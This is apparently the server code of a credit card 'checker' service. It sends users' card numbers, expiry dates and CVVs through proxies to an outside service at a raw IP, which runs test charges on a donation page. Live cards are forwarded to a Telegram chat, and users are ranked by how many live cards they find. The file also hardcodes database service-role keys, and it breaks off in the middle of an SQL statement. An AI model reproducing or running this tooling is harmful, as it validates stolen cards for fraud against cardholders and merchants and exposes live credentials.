const express = require('express');
const path = require('path');
const axios = require('axios');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const { createClient } = require('@supabase/supabase-js');
const dotenv = require('dotenv');
const app = express();
const PORT = process.env.PORT || 3000;

// Load environment variables from .env file
dotenv.config();

// Telegram configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Initialize Supabase client
const supabaseUrl = 'https://ezayhkkjuagkqwaxtluh.supabase.co';
const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV6YXloa2tqdWFna3F3YXh0bHVoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDY4NjIyMzMsImV4cCI6MjA2MjQzODIzM30.UrWPYsodrfyuZcLzbEkjKfnwNW4TSqS4_7SblmAocPk';
const supabaseServiceKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV6YXloa2tqdWFna3F3YXh0bHVoIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0Njg2MjIzMywiZXhwIjoyMDYyNDM4MjMzfQ.WfyuZoQcBcrcMrUO4gRBbvuFR8cGhYy4ydvoztBwc14';

// Supabase is initialized with hardcoded credentials for production

// Create two clients - one with anon key for client-side operations
// and one with service role key for server-side operations
const supabase = createClient(supabaseUrl, supabaseAnonKey);
const supabaseAdmin = createClient(supabaseUrl, supabaseServiceKey, {
  auth: { persistSession: false },
  db: { schema: 'public' }
});

// Helper function to send a message to Telegram
async function sendToTelegram(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      disable_web_page_preview: true
    });

    if (response.data && response.data.ok) {
      console.log('Message sent to Telegram successfully');
      return true;
    } else {
      console.error('Failed to send message to Telegram:', response.data);
      return false;
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
    return false;
  }
}

// Helper function to check if Telegram notifications are enabled
// Now always returns true since Telegram notifications are mandatory
async function getUserTelegramSetting() {
  // Always return true - Telegram notifications are always enabled
  return true;
}

// Helper function to record card check results
async function recordCardCheck(userId, cardData, result, response, amount) {
  try {
    // Map the result to a status
    let status = 'declined';
    if (result && (result.toUpperCase() === 'CHARGED' || result.toUpperCase() === 'APPROVED')) {
      status = 'charged';

      // If it's a live card, send to Telegram
      try {
        // Check if Telegram notifications are enabled
        const telegramEnabled = await getUserTelegramSetting();

        if (telegramEnabled) {
          // Get user information
          const { data: userData } = await supabaseAdmin.auth.admin.getUserById(userId);
          const username = userData?.user?.user_metadata?.username || 'Unknown User';

          // Format the message
          const message = `
🟢 Live Card Detected 🟢

Card: ${cardData}
User: ${username}
Time: ${new Date().toISOString()}
Response: ${response || 'No response data'}
${amount ? `Amount: ${amount}` : ''}
`;

          // Send to Telegram asynchronously (don't await)
          sendToTelegram(message).then(success => {
            if (success) {
              console.log(`Live card sent to Telegram: ${cardData}`);
            }
          });
        } else {
          console.log(`User ${userId} has disabled Telegram notifications, skipping`);
        }
      } catch (telegramError) {
        console.error('Error sending live card to Telegram:', telegramError);
        // Continue with the card check even if Telegram fails
      }
    } else if (result && result.toUpperCase() === '3DS') {
      status = '3ds_challenge';
    }

    // Check if the card_checks table exists
    const { error: tableCheckError } = await supabase
      .from('card_checks')
      .select('id')
      .limit(1);

    // If the table doesn't exist, log a warning and return
    if (tableCheckError && tableCheckError.code === '42P01') { // PostgreSQL error code for undefined_table
      console.warn('Warning: card_checks table does not exist. Please run the setup_database.sql script.');
      return;
    }

    // Insert the card check record using the admin client to bypass RLS
    const { error } = await supabaseAdmin
      .from('card_checks')
      .insert({
        user_id: userId,
        card_data: cardData,
        status,
        response,
        amount,
        checked_at: new Date().toISOString()
      });

    if (error) {
      console.error('Error recording card check:', error);
    }
  } catch (error) {
    console.error('Error in recordCardCheck:', error);
  }
}

// Enable CORS for all origins
app.use(cors({
  origin: '*', // Allow all origins
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  credentials: true,
  maxAge: 86400 // 24 hours
}));

// Parse JSON request bodies
app.use(express.json());

// Additional CORS headers middleware
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  next();
});

// Configure rate limiters
// General API rate limiter - 100 requests per 15 minutes
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
  legacyHeaders: false, // Disable the `X-RateLimit-*` headers
  message: { error: 'Too many requests', message: 'Please try again later' }
});

// Auth rate limiter - 10 requests per 15 minutes (for login/register attempts)
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // limit each IP to 10 requests per windowMs
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many login attempts', message: 'Please try again later' }
});

// Card checking rate limiter - 30 requests per 15 minutes
const cardCheckLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 30, // limit each IP to 30 requests per windowMs
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many card check requests', message: 'Please try again later' }
});

// Apply the general rate limiter to all API routes
app.use('/api/', apiLimiter);

// Stats rate limiter - 60 requests per 15 minutes
const statsLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 60, // limit each IP to 60 requests per windowMs
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many stats requests', message: 'Please try again later' }
});

// Apply specific rate limiters to sensitive endpoints
app.use('/api/auth/', authLimiter);
app.use('/api/check-card', cardCheckLimiter);
app.use('/api/check-cards', cardCheckLimiter);
app.use('/api/stats', statsLimiter);
app.use('/api/user-cards', statsLimiter);

// Authentication middleware
const authenticateUser = async (req, res, next) => {
  try {
    // Get the authorization header
    const authHeader = req.headers.authorization;

    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized', message: 'Authentication token is required' });
    }

    // Extract the token
    const token = authHeader.split(' ')[1];

    // Verify the token with Supabase
    const { data: { user }, error } = await supabase.auth.getUser(token);

    if (error || !user) {
      return res.status(401).json({ error: 'Unauthorized', message: 'Invalid or expired token' });
    }

    // Add the user to the request object
    req.user = user;

    // Continue to the next middleware or route handler
    next();
  } catch (error) {
    console.error('Authentication error:', error);
    return res.status(500).json({ error: 'Server error', message: 'Authentication failed' });
  }
};

// Serve static files from the React app build directory
app.use(express.static(path.join(__dirname, 'dist')));

// API endpoint to check cards (protected)
app.post('/api/check-card', authenticateUser, async (req, res) => {
  try {
    const { cardData, siteUrl, proxy } = req.body;

    if (!cardData) {
      return res.status(400).json({ error: 'Missing required parameter: cardData' });
    }

    // Use default site URL if not provided
    const targetSiteUrl = siteUrl || 'https://rinsekit.com/products/donations';

    // Use provided proxy or default proxy
    const proxyToUse = proxy || 'proxy.example.com:8080:username:password';

    // Validate and format the proxy if needed
    // Porter Proxies format: hostname:port:username:password
    // This format is already compatible with the API

    // Construct the target URL
    const targetUrl = `http://74.50.123.49:6902/shauto?lista=${encodeURIComponent(cardData)}&siteurl=${encodeURIComponent(targetSiteUrl)}&proxy=${encodeURIComponent(proxyToUse)}`;

    // Make the request to the card checking API
    const response = await axios.get(targetUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
      },
      timeout: 30000 // 30 second timeout
    });

    // Record the card check result
    await recordCardCheck(
      req.user.id,
      cardData,
      response.data.result,
      response.data.response,
      response.data.amount
    );

    // Return the response from the card checking API
    res.json(response.data);
  } catch (error) {
    console.error('Error checking card:', error.message);

    // Record the failed card check as declined
    try {
      await recordCardCheck(
        req.user.id,
        cardData,
        'declined',
        error.message,
        null
      );
    } catch (recordError) {
      console.error('Error recording failed card check:', recordError);
    }

    // Return a more detailed error response
    res.status(500).json({
      error: 'Card check failed',
      message: error.message,
      response: error.response ? {
        status: error.response.status,
        statusText: error.response.statusText,
        data: error.response.data
      } : null
    });
  }
});

// API endpoint to check multiple cards (protected)
app.post('/api/check-cards', authenticateUser, async (req, res) => {
  try {
    const { cards, siteUrl, proxy } = req.body;

    if (!cards || !Array.isArray(cards) || cards.length === 0) {
      return res.status(400).json({ error: 'Missing or invalid cards parameter' });
    }

    // Use default site URL if not provided
    const targetSiteUrl = siteUrl || 'https://rinsekit.com/products/donations';

    // Use provided proxy or default proxy
    const proxyToUse = proxy || 'proxy.example.com:8080:username:password';

    // Validate and format the proxy if needed
    // Porter Proxies format: hostname:port:username:password
    // This format is already compatible with the API

    // Process each card
    const results = [];
    const liveCards = []; // Collect live cards for batch notification

    for (const cardData of cards) {
      try {
        // Use proxy for batch card check

        // Construct the target URL
        const targetUrl = `http://74.50.123.49:6902/shauto?lista=${encodeURIComponent(cardData)}&siteurl=${encodeURIComponent(targetSiteUrl)}&proxy=${encodeURIComponent(proxyToUse)}`;

        // Make the request to the card checking API
        const response = await axios.get(targetUrl, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
          },
          timeout: 30000 // 30 second timeout
        });

        // Record the card check result
        await recordCardCheck(
          req.user.id,
          cardData,
          response.data.result,
          response.data.response,
          response.data.amount
        );

        // If it's a live card, add it to the collection for batch notification
        if (response.data.result && (response.data.result.toUpperCase() === 'CHARGED' || response.data.result.toUpperCase() === 'APPROVED')) {
          liveCards.push({
            card: cardData,
            response: response.data.response,
            amount: response.data.amount
          });
        }

        results.push({
          card: cardData,
          ...response.data
        });
      } catch (cardError) {
        // Record the failed card check as declined
        await recordCardCheck(
          req.user.id,
          cardData,
          'declined',
          cardError.message,
          null
        );

        // Add failed card to results
        results.push({
          card: cardData,
          error: cardError.message,
          result: 'declined'
        });
      }

      // Add a small delay between requests to avoid rate limiting
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    // If we have live cards, check if user has enabled Telegram and send a batch notification
    if (liveCards.length > 0) {
      try {
        // Check if the user has enabled Telegram notifications
        const telegramEnabled = await getUserTelegramSetting();

        if (telegramEnabled) {
          // Get user information
          const { data: userData } = await supabaseAdmin.auth.admin.getUserById(req.user.id);
          const username = userData?.user?.user_metadata?.username || 'Unknown User';

          // Format the message
          let message = `
🟢 Batch Live Cards Detected 🟢
User: ${username}
Time: ${new Date().toISOString()}
Total Live Cards: ${liveCards.length}

Cards:
`;

          // Add each card to the message
          liveCards.forEach((card, index) => {
            message += `
${index + 1}. ${card.card}
   Response: ${card.response || 'No response data'}
   ${card.amount ? `Amount: ${card.amount}` : ''}
`;
          });

          // Send to Telegram asynchronously (don't await)
          sendToTelegram(message).then(success => {
            if (success) {
              console.log(`Batch of ${liveCards.length} live cards sent to Telegram`);
            }
          });
        } else {
          console.log(`User ${req.user.id} has disabled Telegram notifications, skipping batch notification`);
        }
      } catch (telegramError) {
        console.error('Error sending batch live cards to Telegram:', telegramError);
        // Continue with the response even if Telegram fails
      }
    }

    // Return all results
    res.json({ results });
  } catch (error) {
    console.error('Error checking cards:', error.message);
    res.status(500).json({ error: 'Cards check failed', message: error.message });
  }
});

// API endpoint to verify authentication
app.get('/api/auth/verify', authenticateUser, (req, res) => {
  // If the middleware passes, the user is authenticated
  res.json({
    authenticated: true,
    user: {
      id: req.user.id,
      email: req.user.email,
      username: req.user.user_metadata?.username || 'User'
    }
  });
});

// API endpoint to check scheduled tasks status (admin only)
app.get('/api/admin/tasks', authenticateUser, async (req, res) => {
  try {
    // Check if the user is an admin
    const { data: userData, error: userError } = await supabaseAdmin
      .from('users')
      .select('is_admin')
      .eq('id', req.user.id)
      .single();

    if (userError) {
      console.error('Error checking admin status:', userError);
      return res.status(500).json({ error: 'Failed to check admin status' });
    }

    // If not an admin, return 403 Forbidden
    if (!userData || !userData.is_admin) {
      return res.status(403).json({ error: 'Forbidden', message: 'Admin access required' });
    }

    // Get the status of all scheduled tasks
    const taskStatus = timerManager.getStatus();

    res.json({
      tasks: taskStatus,
      serverTime: new Date().toISOString()
    });
  } catch (error) {
    console.error('Error in tasks status endpoint:', error);
    res.status(500).json({ error: 'Failed to get tasks status' });
  }
});

// Public API endpoint to get 3DS cleanup timer status
app.get('/api/cleanup-status', authenticateUser, (req, res) => {
  try {
    // Get the status of the 3DS cleanup task
    const taskStatus = timerManager.getTaskStatus('3ds-cleanup');

    if (!taskStatus) {
      return res.status(404).json({ error: 'Task not found', message: '3DS cleanup task not found' });
    }

    // Get the user's 3DS card count from both tables
    const userId = req.user.id;
    let totalCount = 0;

    // We'll make this async but not await it, so we can return the timer status quickly
    (async () => {
      try {
        // Check card_checks table
        const { data: cardChecks, error: checksError } = await supabaseAdmin
          .from('card_checks')
          .select('id')
          .eq('user_id', userId)
          .eq('status', '3ds_challenge');

        if (!checksError) {
          totalCount += cardChecks.length;
        }

        // Check card_stats table
        const { data: cardStats, error: statsError } = await supabaseAdmin
          .from('card_stats')
          .select('count')
          .eq('user_id', userId)
          .eq('status', '3ds_challenge')
          .single();

        if (!statsError && cardStats) {
          totalCount += cardStats.count;
        }

        console.log(`User ${userId} has ${totalCount} 3DS cards total`);
      } catch (error) {
        console.error('Error counting 3DS cards:', error);
      }
    })();

    res.json({
      status: taskStatus,
      serverTime: new Date().toISOString()
    });
  } catch (error) {
    console.error('Error in 3DS cleanup status endpoint:', error);
    res.status(500).json({ error: 'Failed to get 3DS cleanup status' });
  }
});

// API endpoint to get statistics (protected)
app.get('/api/stats', authenticateUser, async (req, res) => {
  try {
    // Get the current user's ID
    const userId = req.user.id;

    // Check if the card_checks table exists using the admin client
    const { error: tableCheckError } = await supabaseAdmin
      .from('card_checks')
      .select('id')
      .limit(1);

    // If the table doesn't exist, throw an error
    if (tableCheckError && tableCheckError.code === '42P01') { // PostgreSQL error code for undefined_table
      throw new Error('card_checks table does not exist. Please run the setup_database.sql script.');
    }

    // Since we're getting an error with the group function, let's use a simpler approach
    // Get all card checks for the current user using the admin client
    const { data: userCardChecks, error: userCardError } = await supabaseAdmin
      .from('card_checks')
      .select('*')
      .eq('user_id', userId);

    if (userCardError) {
      throw new Error(`Error fetching user card stats: ${userCardError.message}`);
    }

    // Count cards by status
    const userCardCounts = {
      charged: 0,
      '3ds_challenge': 0,
      declined: 0
    };

    userCardChecks?.forEach(check => {
      if (check.status in userCardCounts) {
        userCardCounts[check.status]++;
      } else {
        userCardCounts.declined++;
      }
    });

    // Get 3DS card count from card_stats table if it exists
    try {
      const { data: threeDsStats, error: threeDsError } = await supabaseAdmin
        .from('card_stats')
        .select('count')
        .eq('user_id', userId)
        .eq('status', '3ds_challenge')
        .single();

      if (!threeDsError && threeDsStats) {
        // Add the count from card_stats to the count from card_checks
        userCardCounts['3ds_challenge'] += threeDsStats.count;
        console.log(`Added ${threeDsStats.count} 3DS cards from stats table for user ${userId}`);
      }
    } catch (error) {
      console.error('Error fetching 3DS stats:', error);
      // Continue without the stats data
    }

    // Format user's card statistics
    const userCards = Object.entries(userCardCounts).map(([status, count]) => ({
      status,
      count: Number(count)
    }));

    // Calculate total cards checked by the user
    const totalUserCards = userCards.reduce((sum, card) => sum + card.count, 0);

    // Get all card checks using the admin client
    const { data: allCardChecks, error: allCardChecksError } = await supabaseAdmin
      .from('card_checks')
      .select('*');

    if (allCardChecksError) {
      throw new Error(`Error fetching all card checks: ${allCardChecksError.message}`);
    }

    // Count cards by user and status
    const userCardStats = {};
    const userIds = new Set();

    allCardChecks?.forEach(check => {
      // Add user to set of unique users
      userIds.add(check.user_id);

      // Initialize user stats if not exists
      if (!userCardStats[check.user_id]) {
        userCardStats[check.user_id] = {
          charged: 0,
          '3ds_challenge': 0,
          declined: 0
        };
      }

      // Increment count for the appropriate status
      if (check.status in userCardStats[check.user_id]) {
        userCardStats[check.user_id][check.status]++;
      } else {
        userCardStats[check.user_id].declined++;
      }
    });

    // Create top users array
    const topUsersArray = Object.entries(userCardStats).map(([userId, stats]) => ({
      id: userId,
      liveCardsCount: stats.charged || 0
    }));

    // Sort by live cards count and take top 10
    const topUsersData = topUsersArray
      .sort((a, b) => b.liveCardsCount - a.liveCardsCount)
      .slice(0, 10);

    // Get user details for top users
    const topUsers = [];
    for (const userData of topUsersData) {
      // Only add users with at least one live card
      if (userData.liveCardsCount > 0) {
        // Try to get user details, but don't fail if we can't
        try {
          const { data: userDetails } = await supabaseAdmin.auth.admin.getUserById(userData.id);

          if (userDetails) {
            topUsers.push({
              id: userData.id,
              username: userDetails.user.user_metadata?.username || 'User',
              liveCardsCount: userData.liveCardsCount
            });
          } else {
            // If we can't get user details, use a generic name
            topUsers.push({
              id: userData.id,
              username: `User ${topUsers.length + 1}`,
              liveCardsCount: userData.liveCardsCount
            });
          }
        } catch (error) {
          // If we can't get user details, use a generic name
          topUsers.push({
            id: userData.id,
            username: `User ${topUsers.length + 1}`,
            liveCardsCount: userData.liveCardsCount
          });
        }
      }
    }

    // Calculate global statistics
    let liveCards = 0;
    let deadCards = 0;
    let threeDsCards = 0;

    allCardChecks?.forEach(check => {
      if (check.status === 'charged') {
        liveCards++;
      } else if (check.status === '3ds_challenge') {
        threeDsCards++;
        // 3DS cards are now counted separately, not as dead cards
      } else {
        // All other statuses (including 'declined') are counted as dead
        deadCards++;
      }
    });

    // Get 3DS card counts from card_stats table if it exists
    try {
      const { data: threeDsStats, error: threeDsError } = await supabaseAdmin
        .from('card_stats')
        .select('count')
        .eq('status', '3ds_challenge');

      if (!threeDsError && threeDsStats) {
        // Sum up all the counts from the stats table
        const statsCount = threeDsStats.reduce((sum, stat) => sum + stat.count, 0);
        threeDsCards += statsCount;
        console.log(`Added ${statsCount} 3DS cards from stats table to global stats`);
      }
    } catch (error) {
      console.error('Error fetching global 3DS stats:', error);
      // Continue without the stats data
    }

    // Total cards now includes 3DS cards as a separate category
    const totalCards = liveCards + deadCards + threeDsCards;
    const successRate = totalCards > 0 ? `${((liveCards / totalCards) * 100).toFixed(1)}%` : '0%';

    // Prepare global statistics
    const globalStats = {
      liveCards,
      deadCards,
      threeDsCards,
      totalCards,
      totalUsers: userIds.size,
      successRate
    };

    // Return the statistics
    res.json({
      topUsers,
      userCards,
      totalUserCards,
      globalStats
    });
  } catch (error) {
    console.error('Error getting statistics:', error);

    // If there's an error, return mock data as fallback
    const mockTopUsers = [
      { id: '1', username: 'cardmaster', liveCardsCount: 23 },
      { id: '2', username: 'verifier42', liveCardsCount: 18 },
      { id: '3', username: 'securecheck', liveCardsCount: 15 },
      { id: req.user.id, username: req.user.user_metadata?.username || 'User', liveCardsCount: 7 }
    ].sort((a, b) => b.liveCardsCount - a.liveCardsCount).slice(0, 5);

    const mockUserCards = [
      { status: 'charged', count: 7 },
      { status: '3ds_challenge', count: 3 },
      { status: 'declined', count: 12 }
    ];

    const mockTotalUserCards = mockUserCards.reduce((sum, card) => sum + card.count, 0);

    // Update mock data to not count 3DS cards as dead cards
    const mockLiveCards = 142;
    const mockDeadCards = 211; // Reduced from 256 by removing 45 3DS cards
    const mockThreeDsCards = 45;
    const mockTotalCards = mockLiveCards + mockDeadCards + mockThreeDsCards;
    const mockSuccessRate = ((mockLiveCards / mockTotalCards) * 100).toFixed(1) + '%';

    const mockGlobalStats = {
      liveCards: mockLiveCards,
      deadCards: mockDeadCards,
      threeDsCards: mockThreeDsCards,
      totalCards: mockTotalCards,
      totalUsers: 27,
      successRate: mockSuccessRate
    };

    // Return mock data with error message
    res.json({
      error: `Failed to get real statistics: ${error.message}. Using mock data instead.`,
      topUsers: mockTopUsers,
      userCards: mockUserCards,
      totalUserCards: mockTotalUserCards,
      globalStats: mockGlobalStats
    });
  }
});

// API endpoint to get user's live cards
app.get('/api/user-cards/live', authenticateUser, async (req, res) => {
  try {
    const userId = req.user.id;

    // Query to get all live cards for the user using Supabase
    const { data, error } = await supabaseAdmin
      .from('card_checks')
      .select('card_data')
      .eq('user_id', userId)
      .eq('status', 'charged')
      .order('created_at', { ascending: false });

    if (error) {
      throw error;
    }

    // Extract card data from results
    let cards = data.map(row => row.card_data);

    // If no cards found, return mock data for testing
    if (cards.length === 0 && process.env.NODE_ENV !== 'production') {
      cards = [
        '4111111111111111|03|2025|123',
        '4242424242424242|05|2026|456',
        '5555555555554444|07|2024|789'
      ];
      console.log('Using mock live cards data for testing');
    }

    res.json({ cards });
  } catch (error) {
    console.error('Error fetching live cards:', error);
    res.status(500).json({ error: 'Failed to fetch live cards' });
  }
});

// API endpoint to get user's 3DS cards
app.get('/api/user-cards/3ds', authenticateUser, async (req, res) => {
  try {
    const userId = req.user.id;
    let cards = [];
    let totalCount = 0;

    // First, check the card_checks table for actual card data
    const { data: cardChecks, error: checksError } = await supabaseAdmin
      .from('card_checks')
      .select('card_data, response')
      .eq('user_id', userId)
      .eq('status', '3ds_challenge');

    if (checksError) {
      console.error('Error fetching 3DS cards from card_checks:', checksError);
    } else {
      // Process the data from card_checks
      for (const row of cardChecks) {
        if (row.card_data === '3DS_CARD_PLACEHOLDER') {
          // This is a placeholder representing multiple cards
          // Extract the count from the response
          const countMatch = row.response?.match(/Represents (\d+) 3DS cards/);
          const count = countMatch ? parseInt(countMatch[1]) : 1;
          totalCount += count;

          // Add mock data for the placeholder
          for (let i = 0; i < count; i++) {
            cards.push(`4000000000003XXX|XX|20XX|XXX (Placeholder ${i+1} of ${count})`);
          }
        } else {
          // Regular card data
          cards.push(row.card_data);
          totalCount++;
        }
      }
    }

    // Next, check the card_stats table for statistical records
    const { data: cardStats, error: statsError } = await supabaseAdmin
      .from('card_stats')
      .select('count')
      .eq('user_id', userId)
      .eq('status', '3ds_challenge')
      .single();

    if (!statsError && cardStats && cardStats.count > 0) {
      console.log(`Found ${cardStats.count} 3DS cards in stats table for user ${userId}`);

      // If we have stats but no actual cards, generate placeholders
      if (cards.length === 0) {
        const count = cardStats.count;
        totalCount += count;

        // Add a note about the cleaned data
        cards.push(`--- ${count} 3DS cards were cleaned up ---`);

        // Add generic placeholders for the stats
        for (let i = 0; i < Math.min(count, 10); i++) { // Limit to 10 placeholders
          cards.push(`4000000000003XXX|XX|20XX|XXX (Cleaned card ${i+1} of ${count})`);
        }

        if (count > 10) {
          cards.push(`--- ${count - 10} more cards not shown ---`);
        }
      }
    }

    // If no cards found in either table, return mock data for testing
    if (cards.length === 0 && process.env.NODE_ENV !== 'production') {
      cards = [
        '4000000000003063|04|2025|123', // 3DS test card
        '4000000000003220|06|2026|456', // 3DS test card
        '4000000000003089|08|2024|789'  // 3DS test card
      ];
      console.log('Using mock 3DS cards data for testing');
    }

    res.json({
      cards,
      totalCount,
      cleanedUp: totalCount > cards.length
    });
  } catch (error) {
    console.error('Error fetching 3DS cards:', error);
    res.status(500).json({ error: 'Failed to fetch 3DS cards' });
  }
});

// Catch-all handler to serve the React app for any other routes
app.get('*', (_, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

// Timer Management System
class TimerManager {
  constructor() {
    this.timers = {};
    this.tasks = {};
    this.lastRun = {};
    this.nextRun = {};
    this.isInitialized = false;
  }

  // Register a new task
  registerTask(taskId, taskFn, intervalMs, description) {
    this.tasks[taskId] = {
      fn: taskFn,
      interval: intervalMs,
      description: description,
      lastRun: null
    };
    console.log(`Task registered: ${taskId} (${description}) - Interval: ${this.formatTime(intervalMs)}`);
    return this;
  }

  // Start all registered tasks
  startAll(initialDelayMs = 60000) {
    if (this.isInitialized) {
      console.warn('Timer manager already initialized');
      return this;
    }

    console.log(`Starting all scheduled tasks with initial delay of ${this.formatTime(initialDelayMs)}`);

    // Start each task after the initial delay
    setTimeout(() => {
      for (const taskId of Object.keys(this.tasks)) {
        this.startTask(taskId);
      }
      this.isInitialized = true;
      console.log('All scheduled tasks initialized');
    }, initialDelayMs);

    return this;
  }

  // Start a specific task
  startTask(taskId) {
    if (!this.tasks[taskId]) {
      console.error(`Task ${taskId} not found`);
      return this;
    }

    const task = this.tasks[taskId];

    // Run the task immediately
    console.log(`Running task: ${taskId} (${task.description})`);
    this.runTask(taskId);

    // Calculate and store the next run time
    this.updateNextRunTime(taskId);

    // Schedule the task to run at the specified interval
    this.timers[taskId] = setInterval(() => {
      console.log(`Running scheduled task: ${taskId} (${task.description})`);
      this.runTask(taskId);
      // Update the next run time after scheduling the next run
      this.updateNextRunTime(taskId);
    }, task.interval);

    return this;
  }

  // Update the next run time for a task
  updateNextRunTime(taskId) {
    if (!this.tasks[taskId]) return;

    const task = this.tasks[taskId];
    const now = Date.now();
    this.nextRun[taskId] = now + task.interval;

    // Also update the task object
    this.tasks[taskId].nextRun = this.nextRun[taskId];

    // Log the next run time
    const nextRunDate = new Date(this.nextRun[taskId]);
    console.log(`Next run for ${taskId}: ${nextRunDate.toISOString()} (in ${this.formatTime(task.interval)})`);
  }

  // Run a specific task
  async runTask(taskId) {
    if (!this.tasks[taskId]) {
      console.error(`Task ${taskId} not found`);
      return;
    }

    const task = this.tasks[taskId];
    const startTime = Date.now();
    this.lastRun[taskId] = startTime;

    // Update the task object
    this.tasks[taskId].lastRun = startTime;

    try {
      await task.fn();
      const duration = Date.now() - startTime;
      console.log(`Task ${taskId} completed in ${duration}ms`);
    } catch (error) {
      console.error(`Error running task ${taskId}:`, error);
    }
  }

  // Stop a specific task
  stopTask(taskId) {
    if (this.timers[taskId]) {
      clearInterval(this.timers[taskId]);
      delete this.timers[taskId];
      console.log(`Task stopped: ${taskId}`);
    }
    return this;
  }

  // Stop all tasks
  stopAll() {
    for (const taskId in this.timers) {
      this.stopTask(taskId);
    }
    console.log('All tasks stopped');
    return this;
  }

  // Get status of all tasks
  getStatus() {
    const now = Date.now();
    const status = {};

    for (const [taskId, task] of Object.entries(this.tasks)) {
      // Calculate remaining time
      const nextRun = this.nextRun[taskId] || 0;
      const remainingMs = Math.max(0, nextRun - now);

      status[taskId] = {
        description: task.description,
        interval: this.formatTime(task.interval),
        lastRun: task.lastRun ? new Date(task.lastRun).toISOString() : 'Never',
        nextRun: nextRun ? new Date(nextRun).toISOString() : 'Not scheduled',
        remainingTime: this.formatTime(remainingMs),
        remainingMs: remainingMs,
        active: !!this.timers[taskId]
      };
    }
    return status;
  }

  // Get status of a specific task
  getTaskStatus(taskId) {
    if (!this.tasks[taskId]) {
      return null;
    }

    const now = Date.now();
    const task = this.tasks[taskId];

    // If nextRun is not set, calculate it based on lastRun + interval
    if (!this.nextRun[taskId] && task.lastRun) {
      this.nextRun[taskId] = task.lastRun + task.interval;
    }

    // If still not set, set it to now + interval
    if (!this.nextRun[taskId]) {
      this.nextRun[taskId] = now + task.interval;
      // Also update the task object
      this.tasks[taskId].nextRun = this.nextRun[taskId];
    }

    const nextRun = this.nextRun[taskId];
    const remainingMs = Math.max(0, nextRun - now);

    // Ensure we have valid dates
    const lastRunDate = task.lastRun ? new Date(task.lastRun) : null;
    const nextRunDate = new Date(nextRun);

    // Format dates for display
    const lastRunFormatted = lastRunDate ? lastRunDate.toISOString() : 'Never';
    const nextRunFormatted = nextRunDate.toISOString();

    // Calculate percentage complete
    const percentComplete = task.interval > 0 ?
      Math.min(100, Math.max(0, 100 - (remainingMs / task.interval * 100))) : 0;

    // Log for debugging
    console.log(`Task ${taskId} status:`, {
      nextRun,
      nextRunFormatted,
      remainingMs,
      percentComplete
    });

    return {
      description: task.description,
      interval: this.formatTime(task.interval),
      lastRun: lastRunFormatted,
      nextRun: nextRunFormatted,
      remainingTime: this.formatTime(remainingMs),
      remainingMs: remainingMs,
      active: !!this.timers[taskId],
      percentComplete: percentComplete
    };
  }

  // Format milliseconds to a human-readable time
  formatTime(ms) {
    if (ms < 1000) return `${ms}ms`;
    if (ms < 60000) return `${Math.floor(ms / 1000)}s`;
    if (ms < 3600000) return `${Math.floor(ms / 60000)}m`;
    if (ms < 86400000) return `${Math.floor(ms / 3600000)}h`;
    return `${Math.floor(ms / 86400000)}d`;
  }
}

// Create a timer manager instance
const timerManager = new TimerManager();

// Function to ensure the card_stats table exists
async function ensureCardStatsTable() {
  try {
    console.log('Checking if card_stats table exists...');

    // Try to query the table to see if it exists
    const { error } = await supabaseAdmin
      .from('card_stats')
      .select('count(*)', { count: 'exact', head: true });

    // Log the full error object for debugging
    if (error) {
      console.error('Error checking card_stats table:', JSON.stringify(error, null, 2));

      // If the table doesn't exist, create it
      if (error.code === '42P01') { // PostgreSQL error code for undefined_table
        console.log('card_stats table does not exist, creating it...');

        try {
          // Create the table directly using SQL query
          const createTableSQL = `
            CREATE TABLE IF NOT EXISTS card_stats (
              id SERIAL PRIMARY KEY,
              user_id UUID NOT NULL,
              status TEXT NOT NULL,
              count INTEGER NOT NULL DEFAULT 0,
              last_updated TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
